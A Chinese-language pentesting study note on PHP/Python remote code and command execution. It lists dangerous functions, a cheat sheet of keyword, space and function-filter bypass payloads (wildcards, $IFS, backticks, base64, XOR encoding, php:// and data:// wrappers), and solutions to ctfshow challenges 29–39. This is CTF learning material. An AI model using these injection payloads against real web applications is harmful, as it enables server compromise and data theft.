- [ ] ## RCE远程代码执行



RCE代码执行：引用脚本代码解析执行
RCE命令执行：脚本调用操作系统命令

### 漏洞函数：

#### 1.PHP

##### PHP代码执行函数

`eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()`等

##### PHP命令执行函数

`system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等`

#### 2.Python

`eval exec subprocess os.system commands `



#### 3.Java

Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，
但是有反射机制，并且有各种基于反射机制的表达式引擎，如: `OGNL、SpEL、MVEL`等.

#### 伪协议玩法

##### 配合文件包含伪协议（代码执行）

```
include $_GET[a]?>&a=data://text/plain,<?php system('ver');?>

include $_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=index.php
```



#### 关键字过滤

##### 过滤flag关键字

###### 通配符

```
flag=fl*
cat fl*
cat ?la*
```

###### 转义符号

```
ca\t /fl\ag
cat fl''ag
```

###### 使用空变量$*和$@，$x,${x}绕过

```
ca$*t fl$*ag
ca$@t fl$@ag
ca$5t f$5lag
ca${2}t f${2}lag
```

###### 拼接法

```
a=fl;b=ag;cat$IFS$a$b
```

###### 反引号绕过

```
cat `ls`
```

###### 编码绕过

```
echo 'flag' | base64
cat `echo ZmxhZwo= | base64 -d`
```

###### 组合绝活

```
touch "ag"
touch "fl\\"
touch "t \\"
touch "ca\\"
ls -t >shell
sh shell
#  \指的是换行
#  ls -t是将文本按时间排序输出
#  ls -t >shell  将输出输入到shell文件中
#  sh将文本中的文字读取出来执行
```

###### 异或无符号（过滤0-9a-zA-Z）

```
异或：rce-xor.php & rce-xor.py
或：rce-xor-or.php & rce-xor-or.py
```

##### 过滤函数关键字

###### 内敛执行绕过（system）

```
echo `ls`;
echo $(ls);
?><?=`ls`;
?><?=$(ls);
```

##### 过滤执行命令（如cat tac等）

```
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
sh /flag 2>%261 //报错出文件内容
curl file:///root/f/flag
strings flag
uniq -c flag
bash -v flag
rev flag
```

##### 过滤空格

```
%09（url传递）(cat%09flag.php)
cat${IFS}flag
a=fl;b=ag;cat$IFS$a$b
{cat,flag}
```



### 异或案例

异或是一种二进制的位运算，符号以 XOR 或 ^ 表示

过滤所有字符

![image-20240511213314043](D:\Infiltration\笔记\note\图片\image-20240511213314043.png)

#### 异或运算

在rce-xor.php中修改preg，过滤规则`/[a-z0-9]/i`，运行生成一个res.txt

![image-20240511213530700](D:\Infiltration\笔记\note\图片\image-20240511213530700.png)

使用rce-xor.py生成payload，使用system命令执行ipconfig

![image-20240511213820938](D:\Infiltration\笔记\note\图片\image-20240511213820938.png)

成功执行ipconfig

![image-20240511214029411](D:\Infiltration\笔记\note\图片\image-20240511214029411.png)



#### 或运算

在rce-xor-or.php中修改preg，过滤规则`/[a-z0-9]/i`，运行生成一个res_xor.txt

![image-20240511215052132](D:\Infiltration\笔记\note\图片\image-20240511215052132.png)



使用rce-xor-or.py生成payload，使用system命令执行ver

![image-20240511215302846](D:\Infiltration\笔记\note\图片\image-20240511215302846.png)

成功执行ver

![image-20240511215245288](D:\Infiltration\笔记\note\图片\image-20240511215245288.png)



### ctfshow-29

如果c参数里面没有flag就执行eval

![image-20240511221656410](D:\Infiltration\笔记\note\图片\image-20240511221656410.png)



```
c=system('tac fl*');
```

![image-20240511222655921](D:\Infiltration\笔记\note\图片\image-20240511222655921.png)

### ctfshow-30

过滤`flag`，`system`，`php`

![image-20240511222816041](D:\Infiltration\笔记\note\图片\image-20240511222816041.png)

过滤system使用shell_exec

```
c=echo shell_exec('tac fl*');
```

![image-20240511223229615](D:\Infiltration\笔记\note\图片\image-20240511223229615.png)

### ctfshow-31

##### 参数逃逸

过滤flag|system|php|cat|sort|shell

![image-20240511223400714](D:\Infiltration\笔记\note\图片\image-20240511223400714.png)

因为只过滤c里面的参数，重新传参到x就不会过滤

```
c=eval($_GET[x]);&x=system('tac flag*');
```

![image-20240511224711201](D:\Infiltration\笔记\note\图片\image-20240511224711201.png)

### ctfshow-32~36

还过滤了空格

![image-20240511225318910](D:\Infiltration\笔记\note\图片\image-20240511225318910.png)

##### 文件包含伪协议

利用data://text/plain协议执行system

```
c=include$_GET[a]?>&a=data://text/plain,<?php system('tac flag*');?>
```

![image-20240511230019287](D:\Infiltration\笔记\note\图片\image-20240511230019287.png)

利用php://filter/read协议base64编码读取，再使用hackbar进行base64解码

```
c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20240511230303857](D:\Infiltration\笔记\note\图片\image-20240511230303857.png)



### ctfshow-37~39

include包含c参数

![image-20240511234556501](D:\Infiltration\笔记\note\图片\image-20240511234556501.png)

```
c=data://text/plain,<?php system('tac fla*');?>
```

![image-20240511234529953](D:\Infiltration\笔记\note\图片\image-20240511234529953.png)

```
c=php://input
post:<?php system('tac flag.php');?>
```

![image-20240511235007451](D:\Infiltration\笔记\note\图片\image-20240511235007451.png)

### 黑盒-运行-RCE代码命令执行



![image-20240511235445929](D:\Infiltration\笔记\note\图片\image-20240511235445929.png)













